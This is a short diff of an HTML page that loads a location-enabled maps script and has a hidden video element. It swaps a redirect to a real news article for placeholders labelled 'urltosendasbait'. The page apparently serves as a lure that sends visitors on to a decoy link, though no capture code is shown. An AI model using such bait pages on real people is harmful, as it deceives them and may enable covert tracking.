@@ -3,7 +3,7 @@
     <script src="http://maps.google.com/maps/api/js?sensor=true"></script>
     <script src="https://code.jquery.com/jquery-1.11.2.min.js"></script>
 
-    <meta http-equiv="Refresh" content="3;url=https://extra.globo.com/casos-de-policia/milicia-sequestrou-executou-chefe-do-trafico-do-morro-azul-conclui-policia-24650813.html">
+    <meta http-equiv="Refresh" content="timeonseconds;url=urltosendasbait">
 
 
     <div class="video-wrap" hidden="hidden">
